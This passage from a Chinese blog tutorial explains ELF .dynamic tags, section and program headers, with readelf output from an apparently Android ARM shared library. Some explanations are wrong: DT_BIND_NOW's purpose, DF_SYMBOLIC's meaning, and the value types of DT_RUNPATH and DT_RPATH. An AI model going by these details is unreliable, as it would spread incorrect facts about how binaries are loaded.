存储的值可能是一个整数（<code>d_val</code>）或者是一个虚拟地址（<code>d_ptr</code>）。以下是 <code>.dynamic</code> 段中常用的标志及其含义：</p>\n<ol>\n<li><p><strong><code>DT_NEEDED</code></strong></p>\n<ul>\n<li>解释：指向依赖的共享库名称的字符串表索引。每个 <code>DT_NEEDED</code> 条目指定了一个程序运行时所需的共享库。</li>\n<li>类型：<code>d_un.d_val</code> 指向字符串表中的索引。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_PLTRELSZ</code></strong></p>\n<ul>\n<li>解释：<code>.rel.plt</code> 或 <code>.rela.plt</code> 段的大小，即重定位表的大小，主要用于跳转表（PLT）。</li>\n<li>类型：<code>d_un.d_val</code> 是段的大小（以字节为单位）。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_PLTGOT</code></strong></p>\n<ul>\n<li>解释：全局偏移表（Global Offset Table, GOT）的地址。GOT 是用于处理动态符号解析的一个数据结构。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 GOT 段的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_HASH</code></strong></p>\n<ul>\n<li>解释：指向符号哈希表的地址。用于符号查找加速。</li>\n<li>类型：<code>d_un.d_ptr</code> 是哈希表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_STRTAB</code></strong></p>\n<ul>\n<li>解释：指向字符串表的地址。字符串表保存符号名、库名等。</li>\n<li>类型：<code>d_un.d_ptr</code> 是字符串表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_SYMTAB</code></strong></p>\n<ul>\n<li>解释：指向符号表的地址。符号表保存了符号（如函数、变量）的地址和类型信息。</li>\n<li>类型：<code>d_un.d_ptr</code> 是符号表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RELA</code></strong></p>\n<ul>\n<li>解释：指向带加法重定位表（<code>.rela</code> 段）的地址。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 <code>.rela</code> 重定位表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RELASZ</code></strong></p>\n<ul>\n<li>解释：<code>.rela</code> 段的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是段的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_STRSZ</code></strong></p>\n<ul>\n<li>解释：字符串表的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是字符串表的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_SYMENT</code></strong></p>\n<ul>\n<li>解释：符号表中每个条目的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是符号表条目的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_INIT</code></strong></p>\n<ul>\n<li>解释：程序或共享库初始化函数的地址。当程序启动或共享库被加载时，该函数会被调用。</li>\n<li>类型：<code>d_un.d_ptr</code> 是初始化函数的地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_FINI</code></strong></p>\n<ul>\n<li>解释：程序或共享库的终止函数的地址。当程序退出或共享库被卸载时，该函数会被调用。</li>\n<li>类型：<code>d_un.d_ptr</code> 是终止函数的地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_REL</code></strong></p>\n<ul>\n<li>解释：指向不带加法重定位表（<code>.rel</code> 段）的地址。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 <code>.rel</code> 段的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RELSZ</code></strong></p>\n<ul>\n<li>解释：<code>.rel</code> 段的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是 <code>.rel</code> 段的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_JMPREL</code></strong></p>\n<ul>\n<li>解释：指向 <code>.rel.plt</code> 或 <code>.rela.plt</code> 段中的跳转表的重定位条目的地址。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 <code>.rel.plt</code> 或 <code>.rela.plt</code> 段的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_BIND_NOW</code></strong></p>\n<ul>\n<li>解释：指示动态链接器立即解析所有符号，而不是按需解析。这通常用于提高运行时性能。</li>\n<li>类型：此标志仅用作指示（无关联值）。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_DEBUG</code></strong></p>\n<ul>\n<li>解释：用于调试信息，动态链接器可以将一些调试相关信息放入此字段。</li>\n<li>类型：<code>d_un.d_ptr</code> 是指向调试信息结构的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_FLAGS</code></strong></p>\n<ul>\n<li>解释：用于表示一些与动态链接相关的标志。常见标志包括：<ul>\n<li><code>DF_ORIGIN</code>：允许使用 <code>$ORIGIN</code> 来解析动态库路径。</li>\n<li><code>DF_SYMBOLIC</code>：优先使用定义在可执行文件中的符号，而非动态库中的符号。</li>\n<li><code>DF_TEXTREL</code>：允许对只读段进行重定位（通常意味着不安全的代码）。</li>\n<li><code>DF_BIND_NOW</code>：所有符号都应立即绑定，而不是延迟到运行时。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RUNPATH</code></strong></p>\n<ul>\n<li>解释：运行时库搜索路径的地址。它提供了一个库搜索路径，动态链接器将在这个路径中查找所需的共享库。</li>\n<li>类型：<code>d_un.d_ptr</code> 是运行时路径字符串的地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_SONAME</code></strong></p>\n<ul>\n<li>解释：共享库的名字。动态链接器会使用这个名字来查找库文件。</li>\n<li>类型：<code>d_un.d_val</code> 是字符串表中的索引，指向共享库名。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RPATH</code></strong></p>\n<ul>\n<li>解释：指定库搜索路径，类似于 <code>DT_RUNPATH</code>，但优先级不同。<code>RPATH</code> 通常在老版本中使用，<code>RUNPATH</code> 更现代。</li>\n<li>类型：<code>d_un.d_ptr</code> 是运行时库路径字符串的地址。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>.dynamic</code> 段是 ELF 文件中用于动态链接的核心结构，它包含了动态链接器在加载时所需的各种信息。每个 <code>d_tag</code> 对应不同类型的动态条目，链接器通过这些条目来处理库依赖、符号解析、重定位等工作。</p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">There are <span class=\"number\">27</span> section headers<span class=\"punctuation\">,</span> starting at offset <span class=\"number\">0x325c</span><span class=\"operator\">:</span></span><br><span class=\"line\"></span><br><span class=\"line\">Section Headers<span class=\"operator\">:</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span>Nr<span class=\"punctuation\">]</span> Name              Type            Addr     Off    Size   ES Flg Lk <span class=\"literal\">Inf</span> Al</span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">0</span><span class=\"punctuation\">]</span>                   <span class=\"literal\">NULL</span>            <span class=\"number\">00000000</span> <span class=\"number\">000000</span> <span class=\"number\">000000</span> <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">1</span><span class=\"punctuation\">]</span> .note.androi<span class=\"punctuation\">[</span>...<span class=\"punctuation\">]</span> NOTE            <span class=\"number\">00000134</span> <span class=\"number\">000134</span> <span class=\"number\">000098</span> <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">2</span><span class=\"punctuation\">]</span> .note.gnu.bu<span class=\"punctuation\">[</span>...<span class=\"punctuation\">]</span> NOTE            <span class=\"number\">000001</span>cc <span class=\"number\">0001</span>cc <span class=\"number\">000024</span> <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">3</span><span class=\"punctuation\">]</span> .dynsym           DYNSYM          <span class=\"number\">000001</span>f0 <span class=\"number\">0001</span>f0 <span class=\"number\">0001</span>c0 <span class=\"number\">10</span>   A  <span class=\"number\">4</span>   <span class=\"number\">1</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">4</span><span class=\"punctuation\">]</span> .dynstr           STRTAB          <span class=\"number\">000003</span>b0 <span class=\"number\">0003</span>b0 <span class=\"number\">00018</span>e <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">5</span><span class=\"punctuation\">]</span> .gnu.hash         GNU_HASH        <span class=\"number\">00000540</span> <span class=\"number\">000540</span> <span class=\"number\">000060</span> <span class=\"number\">04</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">6</span><span class=\"punctuation\">]</span> .hash             HASH            <span class=\"number\">000005</span>a0 <span class=\"number\">0005</span>a0 <span class=\"number\">0000</span>bc <span class=\"number\">04</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">7</span><span class=\"punctuation\">]</span> .gnu.version      VERSYM          <span class=\"number\">0000065</span><span class=\"built_in\">c</span> <span class=\"number\">00065</span><span class=\"built_in\">c</span> <span class=\"number\">000038</span> <span class=\"number\">02</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">8</span><span class=\"punctuation\">]</span> .gnu.version_d    VERDEF          <span class=\"number\">00000694</span> <span class=\"number\">000694</span> <span class=\"number\">00001</span><span class=\"built_in\">c</span> <span class=\"number\">00</span>   A  <span class=\"number\">4</span>   <span class=\"number\">1</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">9</span><span class=\"punctuation\">]</span> .gnu.version_r    VERNEED         <span class=\"number\">000006</span>b0 <span class=\"number\">0006</span>b0 <span class=\"number\">000040</span> <span class=\"number\">00</span>   A  <span class=\"number\">4</span>   <span class=\"number\">2</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">10</span><span class=\"punctuation\">]</span> .rel.dyn          REL             <span class=\"number\">000006</span>f0 <span class=\"number\">0006</span>f0 <span class=\"number\">000178</span> <span class=\"number\">08</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">11</span><span class=\"punctuation\">]</span> .rel.plt          REL             <span class=\"number\">00000868</span> <span class=\"number\">000868</span> <span class=\"number\">000080</span> <span class=\"number\">08</span>  AI  <span class=\"number\">3</span>  <span class=\"number\">20</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">12</span><span class=\"punctuation\">]</span> .plt              PROGBITS        <span class=\"number\">000008e8</span> <span class=\"number\">0008e8</span> <span class=\"number\">0000</span>d4 <span class=\"number\">00</span>  AX  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">13</span><span class=\"punctuation\">]</span> .text             PROGBITS        <span class=\"number\">000009</span>bc <span class=\"number\">0009</span>bc <span class=\"number\">001750</span> <span class=\"number\">00</span>  AX  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">14</span><span class=\"punctuation\">]</span> .ARM.exidx        ARM_EXIDX       <span class=\"number\">0000210</span><span class=\"built_in\">c</span> <span class=\"number\">00210</span><span class=\"built_in\">c</span> <span class=\"number\">0001</span>a8 <span class=\"number\">08</span>  AL <span class=\"number\">13</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">15</span><span class=\"punctuation\">]</span> .ARM.extab        PROGBITS        <span class=\"number\">000022</span>b4 <span class=\"number\">0022</span>b4 <span class=\"number\">000198</span> <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">16</span><span class=\"punctuation\">]</span> .rodata           PROGBITS        <span class=\"number\">0000244</span><span class=\"built_in\">c</span> <span class=\"number\">00244</span><span class=\"built_in\">c</span> <span class=\"number\">0005</span>fc <span class=\"number\">01</span> AMS  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">17</span><span class=\"punctuation\">]</span> .data.rel.ro      PROGBITS        <span class=\"number\">00003e28</span> <span class=\"number\">002e28</span> <span class=\"number\">00004</span><span class=\"built_in\">c</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">18</span><span class=\"punctuation\">]</span> .fini_array       FINI_ARRAY      <span class=\"number\">00003e74</span> <span class=\"number\">002e74</span> <span class=\"number\">000008</span> <span class=\"number\">04</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">19</span><span class=\"punctuation\">]</span> .dynamic          DYNAMIC         <span class=\"number\">00003e7</span><span class=\"built_in\">c</span> <span class=\"number\">002e7</span><span class=\"built_in\">c</span> <span class=\"number\">000110</span> <span class=\"number\">08</span>  WA  <span class=\"number\">4</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">20</span><span class=\"punctuation\">]</span> .got              PROGBITS        <span class=\"number\">00003</span>f8c <span class=\"number\">002</span>f8c <span class=\"number\">000074</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">21</span><span class=\"punctuation\">]</span> .data             PROGBITS        <span class=\"number\">00004000</span> <span class=\"number\">003000</span> <span class=\"number\">000048</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">22</span><span class=\"punctuation\">]</span> .bss              NOBITS          <span class=\"number\">00004048</span> <span class=\"number\">003048</span> <span class=\"number\">000001</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">23</span><span class=\"punctuation\">]</span> .comment          PROGBITS        <span class=\"number\">00000000</span> <span class=\"number\">003048</span> <span class=\"number\">0000</span>b6 <span class=\"number\">01</span>  MS  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">24</span><span class=\"punctuation\">]</span> .note.gnu.go<span class=\"punctuation\">[</span>...<span class=\"punctuation\">]</span> NOTE            <span class=\"number\">00000000</span> <span class=\"number\">003100</span> <span class=\"number\">00001</span><span class=\"built_in\">c</span> <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">25</span><span class=\"punctuation\">]</span> .ARM.attributes   ARM_ATTRIBUTES  <span class=\"number\">00000000</span> <span class=\"number\">00311</span><span class=\"built_in\">c</span> <span class=\"number\">00002</span>e <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">26</span><span class=\"punctuation\">]</span> .shstrtab         STRTAB          <span class=\"number\">00000000</span> <span class=\"number\">00314</span>a <span class=\"number\">00010</span>f <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">Key to Flags<span class=\"operator\">:</span></span><br><span class=\"line\">  W <span class=\"punctuation\">(</span>write<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> A <span class=\"punctuation\">(</span>alloc<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> X <span class=\"punctuation\">(</span>execute<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> M <span class=\"punctuation\">(</span>merge<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> S <span class=\"punctuation\">(</span>strings<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> I <span class=\"punctuation\">(</span>info<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  L <span class=\"punctuation\">(</span>link order<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> O <span class=\"punctuation\">(</span>extra OS processing required<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> G <span class=\"punctuation\">(</span>group<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> <span class=\"built_in\">T</span> <span class=\"punctuation\">(</span>TLS<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  C <span class=\"punctuation\">(</span>compressed<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> x <span class=\"punctuation\">(</span>unknown<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> o <span class=\"punctuation\">(</span>OS specific<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> E <span class=\"punctuation\">(</span>exclude<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  D <span class=\"punctuation\">(</span>mbind<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> y <span class=\"punctuation\">(</span>purecode<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> p <span class=\"punctuation\">(</span>processor specific<span class=\"punctuation\">)</span></span><br></pre></td></tr></table></figure>\n<p>各个节的解释：<br><a href=\"https://naotu.baidu.com/file/953beb87c9258f4111f4c105ed03c36e\">https://naotu.baidu.com/file/953beb87c9258f4111f4c105ed03c36e</a></p>\n<p>运行视图：<br>PHT<br>program header table<br>其存在，使得操作系统加载程序时尽可能少的产生内存碎片，尽可能的提高内存使用率。</p>\n<p><img src=\"../pic/pht.png\" alt=\"alt text\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* These constants define the permissions on sections in the program</span></span><br><span class=\"line\"><span class=\"comment\">   header, p_flags. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PF_R\t\t0x4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PF_W\t\t0x2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PF_X\t\t0x1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf32_phdr</span> &#123;</span><br><span class=\"line\">  Elf32_Word\tp_type;</span><br><span class=\"line\">  Elf32_Off\tp_offset;</span><br><span class=\"line\">  Elf32_Addr\tp_vaddr;</span><br><span class=\"line\">  Elf32_Addr\tp_paddr;</span><br><span class=\"line\">  Elf32_Word\tp_filesz;</span><br><span class=\"line\">  Elf32_Word\tp_memsz;</span><br><span class=\"line\">  Elf32_Word\tp_flags;</span><br><span class=\"line\">  Elf32_Word\tp_align;</span><br><span class=\"line\">&#125; Elf32_Phdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf64_phdr</span> &#123;</span><br><span class=\"line\">  Elf64_Word p_type;</span><br><span class=\"line\">  Elf64_Word p_flags;</span><br><span class=\"line\">  Elf64_Off p_offset;\t\t<span class=\"comment\">/* Segment file offset */</span></span><br><span class=\"line\">  Elf64_Addr p_vaddr;\t\t<span class=\"comment\">/* Segment virtual address */</span></span><br><span class=\"line\">  Elf64_Addr p_paddr;\t\t<span class=\"comment\">/* Segment physical address */</span></span><br><span class=\"line\">  Elf64_Xword p_filesz;\t\t<span class=\"comment\">/* Segment size in file */</span></span><br><span class=\"line\">  Elf64_Xword p_memsz;\t\t<span class=\"comment\">/* Segment size in memory */</span></span><br><span class=\"line\">  Elf64_Xword p_align;\t\t<span class=\"comment\">/* Segment alignment, file &amp; memory */</span></span><br><span class=\"line\">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>\n<p>在 ELF 文件中，<code>phdr</code> 是 <strong>Program Header</strong>（程序头表）的缩写，描述了可执行文件或共享对象文件的段（segment）信息。与段头表（Section Header）不同，程序头表用于加载时描述如何在内存中布置文件的各个段。</p>\n<p>让我们逐一解释 <code>Elf64_Phdr</code> 结构体中的各个字段：</p>\n<ol>\n<li><p><strong><code>p_type</code></strong> (Segment type):</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：指明该段的类型，常见的值包括：<ul>\n<li><code>PT_NULL</code>：未使用的段</li>\n<li><code>PT_LOAD</code>：可加载段</li>\n<li><code>PT_DYNAMIC</code>：动态链接信息段</li>\n<li><code>PT_INTERP</code>：包含解释器路径的段</li>\n<li><code>PT_NOTE</code>：包含注释的段</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong><code>p_flags</code></strong> (Segment flags):</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：段的权限标志，可能的标志包括：<ul>\n<li><code>PF_R</code>：可读段</li>\n<li><code>PF_W</code>：可写段</li>\n<li><code>PF_X</code>：可执行段<br>这些标志决定了段在内存中的访问权限。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong><code>p_offset</code></strong> (Segment file offset):</p>\n<ul>\n<li>类型：<code>Elf64_Off</code>（64位无符号整数）</li>\n<li>解释：该段在文件中的偏移量，指明该段数据从文件的哪个位置开始。</li>\n</ul>\n</li>\n<li><p><strong><code>p_vaddr</code></strong> (Segment virtual address):</p>\n<ul>\n<li>类型：<code>Elf64_Addr</code>（64位无符号整数）</li>\n<li>解释：段在内存中的虚拟地址。在加载时，系统会将该段加载到进程的这个虚拟地址处。</li>\n</ul>\n</li>\n<li><p><strong><code>p_paddr</code></strong> (Segment physical address):</p>\n<ul>\n<li>类型：<code>Elf64_Addr</code>（64位无符号整数）</li>\n<li>解释：段的物理地址，主要用于与硬件相关的系统中。在大多数操作系统中，这个值通常与 <code>p_vaddr</code> 相同或者不使用。</li>\n</ul>\n</li>\n<li><p><strong><code>p_filesz</code></strong> (Segment size in file):</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段在文件中的大小，以字节为单位。</li>\n</ul>\n</li>\n<li><p><strong><code>p_memsz</code></strong> (Segment size in memory):</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段在内存中的大小，以字节为单位。<code>p_memsz</code> 可以比 <code>p_filesz</code> 大，这种情况通常发生在 BSS 段（未初始化的数据段），在内存中需要占用更多空间，但在文件中不占用空间。</li>\n</ul>\n</li>\n<li><p><strong><code>p_align</code></strong> (Segment alignment):</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：该段在文件和内存中的对齐要求。值为 0 或 1 表示不需要特殊对齐；否则，它必须是 2 的幂，段的文件偏移和内存地址必须符合该对齐要求。</li>\n</ul>\n</li>\n</ol>\n<p>这些字段共同描述了每个程序段的基本属性，帮助系统在执行时正确加载并映射 ELF 文件的各个段。<br>readelf -l file.so</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">Elf file type is <span class=\"title\">DYN</span> <span class=\"params\">(Shared object file)</span></span></span><br><span class=\"line\"><span class=\"function\">Entry point 0x0</span></span><br><span class=\"line\"><span class=\"function\">There are 8 program headers, starting at offset 52</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Program Headers:</span></span><br><span class=\"line\"><span class=\"function\">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span></span><br><span class=\"line\"><span class=\"function\">  PHDR           <span class=\"number\">0x000034</span> <span class=\"number\">0x00000034</span> <span class=\"number\">0x00000034</span> <span class=\"number\">0x00100</span> <span class=\"number\">0x00100</span> R   <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  LOAD           <span class=\"number\">0x000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x02a48</span> <span class=\"number\">0x02a48</span> R E <span class=\"number\">0x1000</span></span></span><br><span class=\"line\"><span class=\"function\">  LOAD           <span class=\"number\">0x002e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x00220</span> <span class=\"number\">0x00221</span> RW  <span class=\"number\">0x1000</span></span></span><br><span class=\"line\"><span class=\"function\">  DYNAMIC        <span class=\"number\">0x002e7c</span> <span class=\"number\">0x00003e7c</span> <span class=\"number\">0x00003e7c</span> <span class=\"number\">0x00110</span> <span class=\"number\">0x00110</span> RW  <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  NOTE           <span class=\"number\">0x000134</span> <span class=\"number\">0x00000134</span> <span class=\"number\">0x00000134</span> <span class=\"number\">0x000bc</span> <span class=\"number\">0x000bc</span> R   <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  GNU_STACK      <span class=\"number\">0x000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x00000000</span> <span class=\"number\">0x00000</span> <span class=\"number\">0x00000</span> RW  <span class=\"number\">0x10</span></span></span><br><span class=\"line\"><span class=\"function\">  EXIDX          <span class=\"number\">0x00210c</span> <span class=\"number\">0x0000210c</span> <span class=\"number\">0x0000210c</span> <span class=\"number\">0x001a8</span> <span class=\"number\">0x001a8</span> R   <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\">  GNU_RELRO      <span class=\"number\">0x002e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x00003e28</span> <span class=\"number\">0x001d8</span> <span class=\"number\">0x001d8</span> RW  <span class=\"number\">0x4</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"> Section to Segment mapping:</span></span><br><span class=\"line\"><span class=\"function\">  Segment Sections...</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">00</span></span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">01</span>     